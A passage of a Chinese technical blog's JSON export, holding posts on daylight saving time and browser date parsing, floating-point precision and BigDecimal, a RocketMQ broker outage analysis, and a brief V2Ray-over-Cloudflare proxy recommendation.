那么, 夏令时到底是什么呢?\\n\\n答: 夏令时是一种为节约能源而人为规定地方时间的制度，在这一制度实行期间所采用的统一时间称为“夏令时间”。一般在天亮较早的夏季人为将时间调快一小时，可以使人早起早睡，减少照明量，以充分利用光照资源，从而节约照明用电。\\n\\n据称最早有夏时制构思的是美国著名政治家、科学家本杰明·富兰克林，他在任美国驻法国大使期间，觉得法国人晚起晚睡的生活习惯浪费了大好的阳光，建议他们早睡早起，这样每年可以节约6千4百万磅蜡烛。夏时制在英语里就是“节约阳光时间”的意思。\\n\\n到1907年，英国建筑师威廉·维莱特正式向英国议会提出夏时制的构思，主要是为了节省能源和提供更多的时间用来训练士兵. 第一次世界大战期间，德国首先实行夏时制，英国因为怕德国会从中得到更大的效益，因此紧跟着也采取了夏时制，夏时制节省了约15%的煤气和电力，而法国不久也效仿实行。\\n\\n1942年，第二次世界大战期间，美国又再度实行夏时制，1945年战争结束后取消。1966年，美国重新实行夏时制。欧洲大部分国家从1976年，即第四次中东战争导致首次石油危机（1973年）三年后开始实行夏时制。\\n\\n1986年至1991年，中华人民共和国在全国范围实行了六年夏时制，每年从4月中旬的第一个星期日2时整（北京时间）到9月中旬第一个星期日的凌晨2时整（北京夏令时）。除1986年因是实行夏时制的第一年，从5月4日开始到9月14日结束外，其它年份均按规定的时段施行。由于省电效果不抵需要适应时间的弊端，1992年4月5日后不再实行，改为夏季下午工作开始及结束时间比冬季推后半个小时。 \\n\\n![](/content/images/2018/03/Screen-Shot-2018-03-11-at-3.38.39-PM.png)\\n\\n(资料来源: [维基百科](https://zh.wikipedia.org/zh-hans/%E5%A4%8F%E6%97%B6%E5%88%B6))\\n\\n\\n时至今日, 在美国,加拿大的大多数地区,以及欧洲的多数国家依然延续着夏令时的机制. 但随着中国停止实施夏令时制, 夏令时对我们如今的生活已经不再产生影响, 夏令时的记忆也随着时光渐渐被人们淡忘. \\n\\n虽然夏令时对如今的我们来说已成为历史, 不过在程序开发的过程中, 夏令时却可能会变成一个隐秘的陷阱. 举个例子, 在1991年的夏天的某一天,中国大陆的正在实施夏令时制, 为了更好的利用早上的时间, 所有人将时间拨快一小时, 这意味着, 在这一天的中国的时区, 实际上应该算作东九区而不是东八区. \\n\\n有趣的是, 不同浏览器(或相同浏览器的不同版本)对这个问题的处理方式却不尽相同, 比如下面这个例子所示:\\n\\nChorme 版本信息[Version 64.0.3282.186 (Official Build) (64-bit)]\\n![](/content/images/2018/03/Screen-Shot-2018-03-11-at-3.57.20-PM.png)\\n\\nSafari: 版本信息[Version 11.0.2 (13604.4.7.1.3)]\\n![](/content/images/2018/03/Screen-Shot-2018-03-11-at-3.58.24-PM.png)\\n\\n在 Chrome 中, 1991-07-16 00:00 +09:00 被解析为本地时间时, 依然是\\n 1991-07-16 00:00, 而在Safari浏览器中(可能是因为没有考虑1991年中国大陆正在实行夏令时制度的因素),  1991-07-16 00:00 +09:00 被解析为本地时间时就变成了 1991-07-15 23:00.\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><blockquote>\n<p>对于像我一样一直生活在中国的年轻人来说, 夏令时也许是比较一个陌生的概念. 那么, 夏令时到底是什么呢?</p>\n</blockquote>\n<p>答: 夏令时是一种为节约能源而人为规定地方时间的制度，在这一制度实行期间所采用的统一时间称为“夏令时间”。一般在天亮较早的夏季人为将时间调快一小时，可以使人早起早睡，减少照明量，以充分利用光照资源，从而节约照明用电。</p>\n<p>据称最早有夏时制构思的是美国著名政治家、科学家本杰明·富兰克林，他在任美国驻法国大使期间，觉得法国人晚起晚睡的生活习惯浪费了大好的阳光，建议他们早睡早起，这样每年可以节约6千4百万磅蜡烛。夏时制在英语里就是“节约阳光时间”的意思。</p>\n<p>到1907年，英国建筑师威廉·维莱特正式向英国议会提出夏时制的构思，主要是为了节省能源和提供更多的时间用来训练士兵. 第一次世界大战期间，德国首先实行夏时制，英国因为怕德国会从中得到更大的效益，因此紧跟着也采取了夏时制，夏时制节省了约15%的煤气和电力，而法国不久也效仿实行。</p>\n<p>1942年，第二次世界大战期间，美国又再度实行夏时制，1945年战争结束后取消。1966年，美国重新实行夏时制。欧洲大部分国家从1976年，即第四次中东战争导致首次石油危机（1973年）三年后开始实行夏时制。</p>\n<p>1986年至1991年，中华人民共和国在全国范围实行了六年夏时制，每年从4月中旬的第一个星期日2时整（北京时间）到9月中旬第一个星期日的凌晨2时整（北京夏令时）。除1986年因是实行夏时制的第一年，从5月4日开始到9月14日结束外，其它年份均按规定的时段施行。由于省电效果不抵需要适应时间的弊端，1992年4月5日后不再实行，改为夏季下午工作开始及结束时间比冬季推后半个小时。</p>\n<p><img src=\"/content/images/2018/03/Screen-Shot-2018-03-11-at-3.38.39-PM.png\" alt=\"\"></p>\n<p>(资料来源: <a href=\"https://zh.wikipedia.org/zh-hans/%E5%A4%8F%E6%97%B6%E5%88%B6\">维基百科</a>)</p>\n<p>时至今日, 在美国,加拿大的大多数地区,以及欧洲的多数国家依然延续着夏令时的机制. 但随着中国停止实施夏令时制, 夏令时对我们如今的生活已经不再产生影响, 夏令时的记忆也随着时光渐渐被人们淡忘.</p>\n<p>虽然夏令时对如今的我们来说已成为历史, 不过在程序开发的过程中, 夏令时却可能会变成一个隐秘的陷阱. 举个例子, 在1991年的夏天的某一天,中国大陆的正在实施夏令时制, 为了更好的利用早上的时间, 所有人将时间拨快一小时, 这意味着, 在这一天的中国的时区, 实际上应该算作东九区而不是东八区.</p>\n<p>有趣的是, 不同浏览器(或相同浏览器的不同版本)对这个问题的处理方式却不尽相同, 比如下面这个例子所示:</p>\n<p>Chorme 版本信息[Version 64.0.3282.186 (Official Build) (64-bit)]<br>\n<img src=\"/content/images/2018/03/Screen-Shot-2018-03-11-at-3.57.20-PM.png\" alt=\"\"></p>\n<p>Safari: 版本信息[Version 11.0.2 (13604.4.7.1.3)]<br>\n<img src=\"/content/images/2018/03/Screen-Shot-2018-03-11-at-3.58.24-PM.png\" alt=\"\"></p>\n<p>在 Chrome 中, 1991-07-16 00:00 +09:00 被解析为本地时间时, 依然是<br>\n1991-07-16 00:00, 而在Safari浏览器中(可能是因为没有考虑1991年中国大陆正在实行夏令时制度的因素),  1991-07-16 00:00 +09:00 被解析为本地时间时就变成了 1991-07-15 23:00.</p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"69","plaintext":"> 对于像我一样一直生活在中国的年轻人来说, 夏令时也许是比较一个陌生的概念. 那么, 夏令时到底是什么呢?\n\n\n答:\n夏令时是一种为节约能源而人为规定地方时间的制度，在这一制度实行期间所采用的统一时间称为“夏令时间”。一般在天亮较早的夏季人为将时间调快一小时，可以使人早起早睡，减少照明量，以充分利用光照资源，从而节约照明用电。\n\n据称最早有夏时制构思的是美国著名政治家、科学家本杰明·富兰克林，他在任美国驻法国大使期间，觉得法国人晚起晚睡的生活习惯浪费了大好的阳光，建议他们早睡早起，这样每年可以节约6千4百万磅蜡烛。夏时制在英语里就是“节约阳光时间”的意思。\n\n到1907年，英国建筑师威廉·维莱特正式向英国议会提出夏时制的构思，主要是为了节省能源和提供更多的时间用来训练士兵.\n第一次世界大战期间，德国首先实行夏时制，英国因为怕德国会从中得到更大的效益，因此紧跟着也采取了夏时制，夏时制节省了约15%的煤气和电力，而法国不久也效仿实行。\n\n1942年，第二次世界大战期间，美国又再度实行夏时制，1945年战争结束后取消。1966年，美国重新实行夏时制。欧洲大部分国家从1976年，即第四次中东战争导致首次石油危机（1973年）三年后开始实行夏时制。\n\n1986年至1991年，中华人民共和国在全国范围实行了六年夏时制，每年从4月中旬的第一个星期日2时整（北京时间）到9月中旬第一个星期日的凌晨2时整（北京夏令时）。除1986年因是实行夏时制的第一年，从5月4日开始到9月14日结束外，其它年份均按规定的时段施行。由于省电效果不抵需要适应时间的弊端，1992年4月5日后不再实行，改为夏季下午工作开始及结束时间比冬季推后半个小时。\n\n\n\n(资料来源: 维基百科 [https://zh.wikipedia.org/zh-hans/%E5%A4%8F%E6%97%B6%E5%88%B6])\n\n时至今日, 在美国,加拿大的大多数地区,以及欧洲的多数国家依然延续着夏令时的机制. 但随着中国停止实施夏令时制, 夏令时对我们如今的生活已经不再产生影响,\n夏令时的记忆也随着时光渐渐被人们淡忘.\n\n虽然夏令时对如今的我们来说已成为历史, 不过在程序开发的过程中, 夏令时却可能会变成一个隐秘的陷阱. 举个例子,\n在1991年的夏天的某一天,中国大陆的正在实施夏令时制, 为了更好的利用早上的时间, 所有人将时间拨快一小时, 这意味着, 在这一天的中国的时区,\n实际上应该算作东九区而不是东八区.\n\n有趣的是, 不同浏览器(或相同浏览器的不同版本)对这个问题的处理方式却不尽相同, 比如下面这个例子所示:\n\nChorme 版本信息[Version 64.0.3282.186 (Official Build) (64-bit)]\n\n\nSafari: 版本信息[Version 11.0.2 (13604.4.7.1.3)]\n\n\n在 Chrome 中, 1991-07-16 00:00 +09:00 被解析为本地时间时, 依然是\n1991-07-16 00:00, 而在Safari浏览器中(可能是因为没有考虑1991年中国大陆正在实行夏令时制度的因素), 1991-07-16 00:00\n+09:00 被解析为本地时间时就变成了 1991-07-15 23:00.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2018-02-05 13:31:40","updated_at":"2018-03-11 17:08:34","published_at":"2018-03-11 10:00:09","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e85","uuid":"ed9443f7-09d5-42e9-9d07-56a813da3da4","title":"理解浮点数","slug":"fu-dian-shu-de-xian-jing","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"> 说到理解浮点数, 最著名的一个问题莫过于 0.1 + 0.2 = ? \\n> 答案似乎显而易见, 运行python交互式终端, 键入算式按下回车, 结果如下\"}],[\"image\",{\"src\":\"/content/images/2019/08/demo.png\"}],[\"markdown\",{\"markdown\":\"> 等等,这似乎并不是我们期待的答案! 要理解这个奇怪的现象,我们就必须从什么是浮点数说起 ...\"}],[\"markdown\",{\"markdown\":\"#### 浮点数的存储\\n\\n以double类型的浮点数为例,数据在内存中由如下三个部分组成: \\n\\n* 符号位S：第 1 位是正负数符号位（sign），0代表正数，1代表负数\\n* 指数位E：中间的 11 位存储指数（exponent），用来表示次方数\\n* 尾数位M：最后的 52 位是尾数（mantissa），首位的始终为1, 在存储时省略, 超出的部分自动进一舍零\"}],[\"image\",{\"src\":\"/content/images/2019/08/double.png\",\"cardWidth\":\"\"}],[\"markdown\",{\"markdown\":\"如 4.5 转换成二进制就是 100.1，科学计数法表示是 1.001*2^2，舍去1后 M = 001。E是一个无符号整数，因为长度是11位，取值范围是 0~2047。但是科学计数法中的指数是可以为负数的，所以再减去一个中间数 1023，[0,1022]表示为负，[1024,2047] 表示为正。如4.5 的指数E = 1025，尾数M为 001。\\n\\n浮点数值可由以下公式表示:\"}],[\"image\",{\"src\":\"/content/images/2019/09/formula.png\"}],[\"markdown\",{\"markdown\":\"换句话说,任何一个浮点数的数值其实是由若干个 2^x 叠加表示的. 那么岂不是很多数值都没有办法用浮点数准确表示?\\n\\n事实的确是这样, 以 0.1 为例, 0.1 转成二进制表示为 0.0001100110011001100(1100循环)，1.100110011001100x2^-4，所以 E=-4+1023=1019；M 舍去首位的1，得到 100110011...。最终就是：\"}],[\"image\",{\"src\":\"/content/images/2019/09/1.png\"}],[\"markdown\",{\"markdown\":\"转化成十进制后为 0.100000000000000005551115123126，因此就出现了浮点误差。\\n\\n事实上, 能用浮点数准确表示的数值只占实数中很小的一部分, 如下图\"}],[\"image\",{\"src\":\"/content/images/2019/08/float_range.jpg\"}],[\"markdown\",{\"markdown\":\"所以在进行高精度运算时(如涉及金额, 或者需要保留小数点后很多位的计算), 请使用如 `java.math.BigDecimal` 这样专门为精度计算所设计的数据类型, 在这样的数据类型中使用了十进制（BigInteger）+ 小数点位置(scale) 来表示小数, 如 `100.001 = 100001 * 0.1^3`,  在这种表示方式下，当然就不会出现精度问题了\"}],[\"markdown\",{\"markdown\":\"参考资料: \\n* [JavaScript 浮点数陷阱及解法](https://github.com/camsong/blog/issues/9)\\n* [Java的BigDecimal如何解决浮点数精度问题](https://blog.csdn.net/kisimple/article/details/43773899)\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[1,\"p\",[]],[1,\"p\",[]]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>说到理解浮点数, 最著名的一个问题莫过于 0.1 + 0.2 = ?<br>\n答案似乎显而易见, 运行python交互式终端, 键入算式按下回车, 结果如下</p>\n</blockquote>\n<!--kg-card-end: markdown--><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"/content/images/2019/08/demo.png\" class=\"kg-image\"></figure><!--kg-card-end: image--><!--kg-card-begin: markdown--><blockquote>\n<p>等等,这似乎并不是我们期待的答案! 要理解这个奇怪的现象,我们就必须从什么是浮点数说起 ...</p>\n</blockquote>\n<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h4 id=\"\">浮点数的存储</h4>\n<p>以double类型的浮点数为例,数据在内存中由如下三个部分组成:</p>\n<ul>\n<li>符号位S：第 1 位是正负数符号位（sign），0代表正数，1代表负数</li>\n<li>指数位E：中间的 11 位存储指数（exponent），用来表示次方数</li>\n<li>尾数位M：最后的 52 位是尾数（mantissa），首位的始终为1, 在存储时省略, 超出的部分自动进一舍零</li>\n</ul>\n<!--kg-card-end: markdown--><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"/content/images/2019/08/double.png\" class=\"kg-image\"></figure><!--kg-card-end: image--><!--kg-card-begin: markdown--><p>如 4.5 转换成二进制就是 100.1，科学计数法表示是 1.001*2^2，舍去1后 M = 001。E是一个无符号整数，因为长度是11位，取值范围是 0~2047。但是科学计数法中的指数是可以为负数的，所以再减去一个中间数 1023，[0,1022]表示为负，[1024,2047] 表示为正。如4.5 的指数E = 1025，尾数M为 001。</p>\n<p>浮点数值可由以下公式表示:</p>\n<!--kg-card-end: markdown--><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"/content/images/2019/09/formula.png\" class=\"kg-image\"></figure><!--kg-card-end: image--><!--kg-card-begin: markdown--><p>换句话说,任何一个浮点数的数值其实是由若干个 2^x 叠加表示的. 那么岂不是很多数值都没有办法用浮点数准确表示?</p>\n<p>事实的确是这样, 以 0.1 为例, 0.1 转成二进制表示为 0.0001100110011001100(1100循环)，1.100110011001100x2^-4，所以 E=-4+1023=1019；M 舍去首位的1，得到 100110011...。最终就是：</p>\n<!--kg-card-end: markdown--><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"/content/images/2019/09/1.png\" class=\"kg-image\"></figure><!--kg-card-end: image--><!--kg-card-begin: markdown--><p>转化成十进制后为 0.100000000000000005551115123126，因此就出现了浮点误差。</p>\n<p>事实上, 能用浮点数准确表示的数值只占实数中很小的一部分, 如下图</p>\n<!--kg-card-end: markdown--><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"/content/images/2019/08/float_range.jpg\" class=\"kg-image\"></figure><!--kg-card-end: image--><!--kg-card-begin: markdown--><p>所以在进行高精度运算时(如涉及金额, 或者需要保留小数点后很多位的计算), 请使用如 <code>java.math.BigDecimal</code> 这样专门为精度计算所设计的数据类型, 在这样的数据类型中使用了十进制（BigInteger）+ 小数点位置(scale) 来表示小数, 如 <code>100.001 = 100001 * 0.1^3</code>,  在这种表示方式下，当然就不会出现精度问题了</p>\n<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><p>参考资料:</p>\n<ul>\n<li><a href=\"https://github.com/camsong/blog/issues/9\">JavaScript 浮点数陷阱及解法</a></li>\n<li><a href=\"https://blog.csdn.net/kisimple/article/details/43773899\">Java的BigDecimal如何解决浮点数精度问题</a></li>\n</ul>\n<!--kg-card-end: markdown--><p></p>","comment_id":"71","plaintext":"> 说到理解浮点数, 最著名的一个问题莫过于 0.1 + 0.2 = ?\n答案似乎显而易见, 运行python交互式终端, 键入算式按下回车, 结果如下\n\n\n> 等等,这似乎并不是我们期待的答案! 要理解这个奇怪的现象,我们就必须从什么是浮点数说起 ...\n\n\n浮点数的存储\n以double类型的浮点数为例,数据在内存中由如下三个部分组成:\n\n * 符号位S：第 1 位是正负数符号位（sign），0代表正数，1代表负数\n * 指数位E：中间的 11 位存储指数（exponent），用来表示次方数\n * 尾数位M：最后的 52 位是尾数（mantissa），首位的始终为1, 在存储时省略, 超出的部分自动进一舍零\n\n如 4.5 转换成二进制就是 100.1，科学计数法表示是 1.001*2^2，舍去1后 M = 001。E是一个无符号整数，因为长度是11位，取值范围是\n0~2047。但是科学计数法中的指数是可以为负数的，所以再减去一个中间数 1023，[0,1022]表示为负，[1024,2047] 表示为正。如4.5\n的指数E = 1025，尾数M为 001。\n\n浮点数值可由以下公式表示:\n\n换句话说,任何一个浮点数的数值其实是由若干个 2^x 叠加表示的. 那么岂不是很多数值都没有办法用浮点数准确表示?\n\n事实的确是这样, 以 0.1 为例, 0.1 转成二进制表示为\n0.0001100110011001100(1100循环)，1.100110011001100x2^-4，所以 E=-4+1023=1019；M\n舍去首位的1，得到 100110011...。最终就是：\n\n转化成十进制后为 0.100000000000000005551115123126，因此就出现了浮点误差。\n\n事实上, 能用浮点数准确表示的数值只占实数中很小的一部分, 如下图\n\n所以在进行高精度运算时(如涉及金额, 或者需要保留小数点后很多位的计算), 请使用如 java.math.BigDecimal \n这样专门为精度计算所设计的数据类型, 在这样的数据类型中使用了十进制（BigInteger）+ 小数点位置(scale) 来表示小数, 如 100.001 =\n100001 * 0.1^3, 在这种表示方式下，当然就不会出现精度问题了\n\n参考资料:\n\n * JavaScript 浮点数陷阱及解法 [https://github.com/camsong/blog/issues/9]\n * Java的BigDecimal如何解决浮点数精度问题\n   [https://blog.csdn.net/kisimple/article/details/43773899]","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2018-03-10 02:42:07","updated_at":"2019-09-01 13:44:42","published_at":"2019-09-01 13:44:05","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5cfa089b31767300013e0e88","uuid":"b66171fe-32ff-4850-a226-c86c02c27213","title":"RocketMQ broker单点宕机导致部分Topic无法发送问题分析","slug":"rocketmq-brokerdan-dian-dang-ji-dao-zhi-bu-fen-topicwu-fa-fa-song-wen-ti-fen-xi","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\n#### 背景\\n\\n项目生产环境的RocketMQ采用双主双从的架构, 期望达到不丢消息且高可用的目的. 而在实际的生产场景中, 我们却遭遇了当一台broker因内存不足导致java进程终止后, 部分topic消息无法正常发送的问题. 现象和预期不相符, 针对这一问题, 我们对RocketMQ相关部分的设计原理进行了更深入的研究. \\n\\n\\n\\n\\n#### 设计分析\\n![RocketMQ--](/content/images/2019/03/RocketMQ--.png)\\n\\n\\n\\n根据以上状态图可知, Producer 第一次发送会根据 AUTO_CREATE_TOPIC_KEY(TBW102) 从 NameServer 拿到 topicRouteData 作为新创建 topic 的 topicRouteData，而 Producer 中的 MQClientInstance 每30s会从 NameServer 拉取 topic 的 topicRouteData 最新信息并更新到本地内存。\\n\\n\\n\\n* 异常情况1\\n\\nProducer 发送一条信息后关闭掉 Producer，这个时候只有在一个 broker 上面有 topic 信息，下一次启动 Producer 发送消息的时候就会直接从 NameServer 拿到最新的 topicRouteData，这样就只能在一个 master 节点上面创建 topic\\n\\n* 异常情况2\\n\\nProducer 发送一条信息后，这个时候只有在一个 broker 上面有 topic 信息，隔35s在发送一条信息，在这段时间内，已经完成 MQClientInstance 对 Topic Route 的更新，topicRouteData 只会拉取到一个master节点，这样也只能在一个master节点上面创建topic\\n\\n\\n\\n结合项目当前的Topic设计和生产环境的实际情况做进一步分析, 以成交消息为例, 我们为每个交易品种都分配了不同的topic, 很可能在某个交易上线初期只有非常少的成交发生, 这就导致了如上所述异常情况2的问题\\n\\n\\n\\n\\n#### 解决方案\\n\\n综合评估问题原因及解决成本等因素后, 我们决定采用如下方案对该问题进行修复:\\n\\n开发程序部署到生产环境, 定时检查出路由信息只到一个broker的topic\\n根据该topic原本的queueNum等配置, 将其创建到其他的broker上\\n该程序由系统crontab调度, 每天晚上7点定时执行\\n一般新上交易品种开放交易的时间在晚上6点左右, 这样, 基本上在1小时内, 就能够将该交易品种对应的topic创建到各个broker上, 从而真正实现MQ的高可用\\n\\n\\n\\n\\n#### 思考\\n\\n对于这一问题, RocketMQ官方并不认为这是 RocketMQ 的BUG或者设计上的失误. 首先, RocketMQ的topic是一个比较重的资源, 不建议在生产环境中开启 autoCreateTopicEnable 这一配置, 而应该通过显式的方式明确地对topic进行管理. 以此展开, 交易所目前为每个交易品种分配单独topic的设计也并不是一个很好的实践.\\n\\n![Screen-Shot-2019-03-20-at-10.46.20-AM](/content/images/2019/03/Screen-Shot-2019-03-20-at-10.46.20-AM.png)\\n\\n\\n\\n更多关于本问题的讨论, 可以参考 https://github.com/apache/rocketmq/issues/566\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><h4 id=\"\">背景</h4>\n<p>项目生产环境的RocketMQ采用双主双从的架构, 期望达到不丢消息且高可用的目的. 而在实际的生产场景中, 我们却遭遇了当一台broker因内存不足导致java进程终止后, 部分topic消息无法正常发送的问题. 现象和预期不相符, 针对这一问题, 我们对RocketMQ相关部分的设计原理进行了更深入的研究.</p>\n<h4 id=\"\">设计分析</h4>\n<p><img src=\"/content/images/2019/03/RocketMQ--.png\" alt=\"RocketMQ--\"></p>\n<p>根据以上状态图可知, Producer 第一次发送会根据 AUTO_CREATE_TOPIC_KEY(TBW102) 从 NameServer 拿到 topicRouteData 作为新创建 topic 的 topicRouteData，而 Producer 中的 MQClientInstance 每30s会从 NameServer 拉取 topic 的 topicRouteData 最新信息并更新到本地内存。</p>\n<ul>\n<li>异常情况1</li>\n</ul>\n<p>Producer 发送一条信息后关闭掉 Producer，这个时候只有在一个 broker 上面有 topic 信息，下一次启动 Producer 发送消息的时候就会直接从 NameServer 拿到最新的 topicRouteData，这样就只能在一个 master 节点上面创建 topic</p>\n<ul>\n<li>异常情况2</li>\n</ul>\n<p>Producer 发送一条信息后，这个时候只有在一个 broker 上面有 topic 信息，隔35s在发送一条信息，在这段时间内，已经完成 MQClientInstance 对 Topic Route 的更新，topicRouteData 只会拉取到一个master节点，这样也只能在一个master节点上面创建topic</p>\n<p>结合项目当前的Topic设计和生产环境的实际情况做进一步分析, 以成交消息为例, 我们为每个交易品种都分配了不同的topic, 很可能在某个交易上线初期只有非常少的成交发生, 这就导致了如上所述异常情况2的问题</p>\n<h4 id=\"\">解决方案</h4>\n<p>综合评估问题原因及解决成本等因素后, 我们决定采用如下方案对该问题进行修复:</p>\n<p>开发程序部署到生产环境, 定时检查出路由信息只到一个broker的topic<br>\n根据该topic原本的queueNum等配置, 将其创建到其他的broker上<br>\n该程序由系统crontab调度, 每天晚上7点定时执行<br>\n一般新上交易品种开放交易的时间在晚上6点左右, 这样, 基本上在1小时内, 就能够将该交易品种对应的topic创建到各个broker上, 从而真正实现MQ的高可用</p>\n<h4 id=\"\">思考</h4>\n<p>对于这一问题, RocketMQ官方并不认为这是 RocketMQ 的BUG或者设计上的失误. 首先, RocketMQ的topic是一个比较重的资源, 不建议在生产环境中开启 autoCreateTopicEnable 这一配置, 而应该通过显式的方式明确地对topic进行管理. 以此展开, 交易所目前为每个交易品种分配单独topic的设计也并不是一个很好的实践.</p>\n<p><img src=\"/content/images/2019/03/Screen-Shot-2019-03-20-at-10.46.20-AM.png\" alt=\"Screen-Shot-2019-03-20-at-10.46.20-AM\"></p>\n<p>更多关于本问题的讨论, 可以参考 <a href=\"https://github.com/apache/rocketmq/issues/566\">https://github.com/apache/rocketmq/issues/566</a></p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"5c91af74ef5a640001c554a8","plaintext":"背景\n项目生产环境的RocketMQ采用双主双从的架构, 期望达到不丢消息且高可用的目的. 而在实际的生产场景中,\n我们却遭遇了当一台broker因内存不足导致java进程终止后, 部分topic消息无法正常发送的问题. 现象和预期不相符, 针对这一问题,\n我们对RocketMQ相关部分的设计原理进行了更深入的研究.\n\n设计分析\n\n\n根据以上状态图可知, Producer 第一次发送会根据 AUTO_CREATE_TOPIC_KEY(TBW102) 从 NameServer 拿到\ntopicRouteData 作为新创建 topic 的 topicRouteData，而 Producer 中的 MQClientInstance\n每30s会从 NameServer 拉取 topic 的 topicRouteData 最新信息并更新到本地内存。\n\n * 异常情况1\n\nProducer 发送一条信息后关闭掉 Producer，这个时候只有在一个 broker 上面有 topic 信息，下一次启动 Producer\n发送消息的时候就会直接从 NameServer 拿到最新的 topicRouteData，这样就只能在一个 master 节点上面创建 topic\n\n * 异常情况2\n\nProducer 发送一条信息后，这个时候只有在一个 broker 上面有 topic 信息，隔35s在发送一条信息，在这段时间内，已经完成\nMQClientInstance 对 Topic Route 的更新，topicRouteData\n只会拉取到一个master节点，这样也只能在一个master节点上面创建topic\n\n结合项目当前的Topic设计和生产环境的实际情况做进一步分析, 以成交消息为例, 我们为每个交易品种都分配了不同的topic,\n很可能在某个交易上线初期只有非常少的成交发生, 这就导致了如上所述异常情况2的问题\n\n解决方案\n综合评估问题原因及解决成本等因素后, 我们决定采用如下方案对该问题进行修复:\n\n开发程序部署到生产环境, 定时检查出路由信息只到一个broker的topic\n根据该topic原本的queueNum等配置, 将其创建到其他的broker上\n该程序由系统crontab调度, 每天晚上7点定时执行\n一般新上交易品种开放交易的时间在晚上6点左右, 这样, 基本上在1小时内, 就能够将该交易品种对应的topic创建到各个broker上,\n从而真正实现MQ的高可用\n\n思考\n对于这一问题, RocketMQ官方并不认为这是 RocketMQ 的BUG或者设计上的失误. 首先, RocketMQ的topic是一个比较重的资源,\n不建议在生产环境中开启 autoCreateTopicEnable 这一配置, 而应该通过显式的方式明确地对topic进行管理. 以此展开,\n交易所目前为每个交易品种分配单独topic的设计也并不是一个很好的实践.\n\n\n\n更多关于本问题的讨论, 可以参考 https://github.com/apache/rocketmq/issues/566","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2019-03-20 03:11:48","updated_at":"2019-03-20 03:21:44","published_at":"2019-03-20 03:16:24","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5d6a74073faccd0001d04f25","uuid":"d85c3617-05e3-4092-a3da-e8fde4344641","title":"初探: 时间序列平稳性检测在跨期套利中的应用","slug":"shi-jian-xu-lie-ping-wen-guo-cheng","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[],\"sections\":[[1,\"p\",[[0,[],0,\"\"]]]]}","html":null,"comment_id":"5d6a74073faccd0001d04f25","plaintext":null,"feature_image":null,"featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2019-08-31 13:20:07","updated_at":"2019-09-01 13:46:11","published_at":null,"custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5d6bcbeb3faccd0001d04fb6","uuid":"48bb0c6b-8feb-4775-81f5-0c41c03ae445","title":"V2Ray+Cloudflare搭建\"永不被墙\"的梯子","slug":"v2ray-with-cloudflare","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"markdown\",{\"markdown\":\"之前一直在自己的VPS搭建`Shadowsocks`服务端做梯子, 不过在一些政治敏感时期, 墙的力度会增强, 前段时间我发现Vultr的所有IP几乎都直接被墙了\\n\\n经过了解, 决定改用`V2Ray`搭建一个新的梯子. 我觉得`V2Ray`最牛逼的一个点是可以将流量伪装成Websocket并通过Cloudflare(CDN)来代理, 而CDN整个被墙掉的概率很低的 ...\\n\\n建议使用[这个项目](https://github.com/233boy/v2ray)来搭建V2Ray服务端, 非常好用\\n\\n速度方面可以接受, Google查个资料, YouTube看个视频基本还是没问题的\"}]],\"markups\":[],\"sections\":[[10,0],[1,\"p\",[]]]}","html":"<!--kg-card-begin: markdown--><p>之前一直在自己的VPS搭建<code>Shadowsocks</code>服务端做梯子, 不过在一些政治敏感时期, 墙的力度会增强, 前段时间我发现Vultr的所有IP几乎都直接被墙了</p>\n<p>经过了解, 决定改用<code>V2Ray</code>搭建一个新的梯子. 我觉得<code>V2Ray</code>最牛逼的一个点是可以将流量伪装成Websocket并通过Cloudflare(CDN)来代理, 而CDN整个被墙掉的概率很低的 ...</p>\n<p>建议使用<a href=\"https://github.com/233boy/v2ray\">这个项目</a>来搭建V2Ray服务端, 非常好用</p>\n<p>速度方面可以接受, Google查个资料, YouTube看个视频基本还是没问题的</p>\n<!--kg-card-end: 